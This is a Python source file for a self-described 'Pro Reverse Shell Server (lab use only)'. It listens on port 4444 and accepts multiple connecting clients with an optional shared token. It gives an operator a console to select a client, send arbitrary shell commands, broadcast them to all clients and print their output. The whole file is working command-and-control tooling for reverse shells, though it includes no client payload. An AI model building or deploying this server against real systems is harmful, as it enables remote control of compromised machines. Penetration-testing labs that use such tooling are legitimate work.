

import argparse
import logging
import socket
import threading
import signal
import sys
import time
import select
import os
from logging.handlers import RotatingFileHandler
from typing import Optional, Tuple, Dict

try:
    from colorama import init as colorama_init
    from colorama import Fore, Style
except Exception:
    print("[!] colorama is required. Install: pip install colorama")
    sys.exit(1)

colorama_init(autoreset=True)


DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 4444
BUFFER_SIZE = 8192
ENCODING = "utf-8"
DEFAULT_TOKEN = "lab-secret-token"  
LOG_FILE = "pro_reverse_shell.log"
READ_IDLE_THRESHOLD = 0.35  #
SELECT_TIMEOUT = 0.12

# ----- Logging setup -----

def setup_logging(path: str) -> logging.Logger:
    logger = logging.getLogger("pro-reverse-shell")
    logger.setLevel(logging.INFO)
    fmt = logging.Formatter("%(asctime)s - %(levelname)s - %(threadName)s - %(message)s")

    ch = logging.StreamHandler(sys.stdout)
    ch.setFormatter(fmt)
    logger.addHandler(ch)

    fh = RotatingFileHandler(path, maxBytes=1_000_000, backupCount=5, encoding="utf-8")
    fh.setFormatter(fmt)
    logger.addHandler(fh)

    return logger

# ----- Client metadata -----
class ClientInfo:
    def __init__(self, sock: socket.socket, addr: Tuple[str, int], connected_at: float):
        self.sock = sock
        self.addr = addr
        self.connected_at = connected_at
        self.thread: Optional[threading.Thread] = None
        self.alive = True
        self.desc = "unknown"

# ----- Colored banner -----

def banner_text(host: str, port: int, auth_on: bool, logfile: str) -> str:
    lines = []
    lines.append("╔" + "═" * 72 + "╗")
    lines.append("║  " + Fore.CYAN + "Reverse Shell — PRO" + Style.RESET_ALL + f"  | Listening: {host}:{port}".ljust(49) + f"Auth: {'ON' if auth_on else 'OFF'}".rjust(9) + "  ║")
    lines.append("║  Log: " + logfile.ljust(68) + "║")
    lines.append("╚" + "═" * 72 + "╝")
    return "\n".join(lines)

# ----- Receive until idle (no end-marker) -----

def recv_until_idle(sock: socket.socket, timeout: float = 5.0) -> bytes:
    """
    Collect bytes from a socket without an explicit end marker.
    Uses non-blocking reads and select; treats output as finished if a short idle
    period passes with no incoming data.
    Returns collected bytes (may be empty).
    """
    sock.setblocking(False)
    data = bytearray()
    last_data_time = time.time()
    end_time = time.time() + timeout

    try:
        while time.time() < end_time:
            rlist, _, _ = select.select([sock], [], [], SELECT_TIMEOUT)
            if rlist:
                try:
                    chunk = sock.recv(BUFFER_SIZE)
                except BlockingIOError:
                    chunk = b""
                if not chunk:
                    # connection closed or no data
                    break
                data.extend(chunk)
                last_data_time = time.time()
                # if chunk smaller than buffer, likely nearing end
                if len(chunk) < BUFFER_SIZE:
                    # brief window for additional bytes
                    time.sleep(0.08)
                    continue
            else:
                # no data during select timeout
                if data and (time.time() - last_data_time) > READ_IDLE_THRESHOLD:
                    break
                continue
    finally:
        try:
            sock.setblocking(True)
        except Exception:
            pass

    return bytes(data)

# ----- Client session thread -----
class ClientSession(threading.Thread):
    def __init__(self, client_info: ClientInfo, token_required: Optional[str], logger: logging.Logger):
        super().__init__(daemon=True)
        self.client = client_info
        self.token_required = token_required
        self.logger = logger
        self.sock = client_info.sock
        self.addr = client_info.addr

    def run(self):
        self.logger.info(f"Handler started for {self.addr[0]}:{self.addr[1]}")
        try:
            if self.token_required:
                if not self.perform_token_auth():
                    self.logger.warning(f"Auth failed for {self.addr}")
                    self.client.alive = False
                    return
            # After auth, keep a light listen loop for unsolicited data
            self.listen_loop()
        except Exception as e:
            self.logger.exception(f"Client handler error: {e}")
        finally:
            self.client.alive = False
            try:
                self.sock.close()
            except Exception:
                pass
            self.logger.info(f"Handler finished for {self.addr}")

    def perform_token_auth(self) -> bool:
        try:
            # Ask for token
            self.sock.sendall(b"TOKEN?\n")
            self.sock.settimeout(10.0)
            line = b""
            while True:
                part = self.sock.recv(128)
                if not part:
                    break
                line += part
                if b"\n" in part:
                    break
            token = line.decode(ENCODING, errors='ignore').strip()
            self.sock.settimeout(None)
            if token != self.token_required:
                try:
                    self.sock.sendall(b"AUTH_FAIL\n")
                except Exception:
                    pass
                return False
            try:
                self.sock.sendall(b"AUTH_OK\n")
            except Exception:
                pass
            return True
        except Exception:
            self.logger.exception("Auth exception")
            return False

    def listen_loop(self):
        # This session does not read operator commands directly from network.
        # It watches for unsolicited data that the client might send and logs it.
        try:
            self.sock.settimeout(0.5)
            while self.client.alive:
                try:
                    r, _, _ = select.select([self.sock], [], [], 0.2)
                    if r:
                        payload = recv_until_idle(self.sock, timeout=0.6)
                        if payload:
                            txt = payload.decode(ENCODING, errors='ignore')
                            self.logger.info(f"Unsolicited data from {self.addr}: {txt[:200]!r}")
                    else:
                        time.sleep(0.05)
                except (OSError, ValueError):
                    break
        finally:
            self.client.alive = False

# ----- Main server class -----
class ProServer:
    def __init__(self, host: str, port: int, token: Optional[str], logger: logging.Logger):
        self.host = host
        self.port = port
        self.token = token
        self.logger = logger
        self.sock: Optional[socket.socket] = None
        self.clients: Dict[int, ClientInfo] = {}
        self.next_id = 1
        self.running = False
        self._shutdown = False

    def start(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))
        self.sock.listen(10)
        self.running = True
        self.logger.info(f"Listening on {self.host}:{self.port}")
        threading.Thread(target=self.accept_loop, daemon=True).start()
        # Start operator interface
        self.operator_loop()

    def accept_loop(self):
        while self.running and not self._shutdown:
            try:
                client_sock, addr = self.sock.accept()
                cid = self.next_id
                self.next_id += 1
                info = ClientInfo(client_sock, addr, time.time())
                self.clients[cid] = info
                session = ClientSession(info, self.token, self.logger)
                info.thread = session
                session.start()
                self.logger.info(f"Client #{cid} connected: {addr[0]}:{addr[1]}")
            except Exception as e:
                if not self._shutdown:
                    self.logger.exception(f"Accept loop error: {e}")
                time.sleep(0.2)

    def stop(self):
        self._shutdown = True
        self.running = False
        try:
            if self.sock:
                self.sock.close()
        except Exception:
            pass
        # Close all clients
        for cid, info in list(self.clients.items()):
            try:
                info.alive = False
                info.sock.close()
            except Exception:
                pass
        self.logger.info("Server stopped")

    # Operator UI loop
    def operator_loop(self):
        print(banner_text(self.host, self.port, bool(self.token), LOG_FILE))
        print(Fore.GREEN + "[Type 'help' for commands]")
        active_id: Optional[int] = None
        try:
            while True:
                try:
                    cmdline = input(Fore.YELLOW + "server> " + Style.RESET_ALL).strip()
                except EOFError:
                    break

                if not cmdline:
                    continue
                parts = cmdline.split()
                cmd = parts[0].lower()

                if cmd == 'help':
                    self.print_help()
                    continue
                if cmd == 'clients':
                    self.print_clients()
                    continue
                if cmd == 'select':
                    if len(parts) < 2:
                        print("Usage: select <client_id>")
                        continue
                    try:
                        cid = int(parts[1])
                    except ValueError:
                        print("Client ID must be a number")
                        continue
                    if cid in self.clients and self.clients[cid].alive:
                        active_id = cid
                        print(f"Selected client #{cid} -> {self.clients[cid].addr[0]}:{self.clients[cid].addr[1]}")
                    else:
                        print("No such alive client")
                    continue
                if cmd == 'clear':
                    os.system('cls' if os.name == 'nt' else 'clear')
                    continue
                if cmd == 'exit' or cmd == 'quit':
                    print("Shutting down server...")
                    break
                if cmd == 'broadcast':
                    if len(parts) < 2:
                        print("Usage: broadcast <command>")
                        continue
                    tosend = cmdline[len('broadcast '):]
                    self.broadcast_command(tosend)
                    continue
                if cmd == 'info':
                    self.print_status()
                    continue

                # Any other command is sent to the selected client
                if active_id is None:
                    print("Select a client first with: select <client_id>")
                    continue
                if active_id not in self.clients or not self.clients[active_id].alive:
                    print("Selected client is not available anymore")
                    active_id = None
                    continue

                client_info = self.clients[active_id]
                try:
                    client_info.sock.sendall((cmdline + "\n").encode(ENCODING))
                except Exception as e:
                    print(Fore.RED + f"Failed to send to client #{active_id}: {e}")
                    client_info.alive = False
                    continue

                payload = recv_until_idle(client_info.sock, timeout=8.0)
                if payload:
                    tstamp = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
                    print(Fore.CYAN + "─" * 60)
                    print(Fore.GREEN + f"> OUTPUT — {tstamp}")
                    try:
                        text = payload.decode(ENCODING, errors='ignore')
                        print(text, end="")
                    except Exception:
                        print("(non-text binary data)")
                    print(Fore.CYAN + "\n" + "─" * 60 + Style.RESET_ALL)
                else:
                    print(Fore.MAGENTA + "(No output received or command produced no stdout/stderr)")

        except KeyboardInterrupt:
            print("\nKeyboard interrupt — shutting down")
        finally:
            self.stop()

    def broadcast_command(self, command: str):
        print(f"Broadcasting to {len(self.clients)} clients...")
        for cid, info in list(self.clients.items()):
            if not info.alive:
                continue
            try:
                info.sock.sendall((command + "\n").encode(ENCODING))
                payload = recv_until_idle(info.sock, timeout=5.0)
                print(Fore.YELLOW + f"--- Client #{cid} ({info.addr[0]}) ---")
                if payload:
                    print(payload.decode(ENCODING, errors='ignore'))
                else:
                    print("(no output)")
            except Exception as e:
                print(Fore.RED + f"Failed for client #{cid}: {e}")

    def print_clients(self):
        print(Fore.CYAN + "[Clients]")
        for cid, info in list(self.clients.items()):
            age = int(time.time() - info.connected_at)
            status = "alive" if info.alive else "closed"
            print(f" #{cid:2d}  {info.addr[0]}:{info.addr[1]}    {status}    connected {age}s")

    def print_help(self):
        print("Commands:")
        print("  help            - show this")
        print("  clients         - list connected clients")
        print("  select <id>     - select a client for interaction")
        print("  broadcast <cmd> - send to all clients")
        print("  info            - server status")
        print("  clear           - clear screen")
        print("  exit / quit     - stop server")

    def print_status(self):
        up = int(time.time() - os.path.getmtime(LOG_FILE)) if os.path.exists(LOG_FILE) else 0
        print(Fore.GREEN + f"Clients: {len(self.clients)} | Log: {LOG_FILE} | Uptime (approx): {up}s")

# ----- CLI -----

def parse_args():
    p = argparse.ArgumentParser(description="Pro Reverse Shell Server (lab use only)")
    p.add_argument('--host', default=DEFAULT_HOST)
    p.add_argument('--port', default=DEFAULT_PORT, type=int)
    p.add_argument('--no-auth', action='store_true', help='Disable preshared token auth')
    p.add_argument('--token', default=DEFAULT_TOKEN, help='Preshared token (change per lab)')
    p.add_argument('--log', default=LOG_FILE, help='Log file path')
    return p.parse_args()

# ----- Main -----

def main():
    args = parse_args()
    logger = setup_logging(args.log)
    token = None if args.no_auth else args.token

    server = ProServer(args.host, args.port, token, logger)

    def sigint_handler(signum, frame):
        logger.info('Signal received, shutting down...')
        server.stop()
        sys.exit(0)

    signal.signal(signal.SIGINT, sigint_handler)
    signal.signal(signal.SIGTERM, sigint_handler)

    try:
        server.start()
    except Exception:
        logger.exception("Fatal error in server")
    finally:
        server.stop()

if __name__ == '__main__':
    main()
